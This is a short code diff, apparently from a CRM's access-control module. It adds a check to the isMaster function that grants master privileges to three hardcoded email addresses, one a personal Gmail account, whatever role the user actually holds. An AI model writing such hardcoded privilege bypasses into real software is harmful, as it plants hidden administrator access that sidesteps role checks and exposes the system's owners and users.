@@ -173,6 +173,8 @@ function resolveUserAccess(role, inputAccess = {}) {
 }
 
 function isMaster(user = {}) {
+  const email = String(user?.email || '').trim().toLowerCase();
+  if (email === 'admin@crm.com' || email === 'chorstconsult@gmail.com' || email === 'carlos.horst@doubletelecom.com.br') return true;
   return normalizeRole(user.actualRole || user.role) === 'MASTER';
 }
 
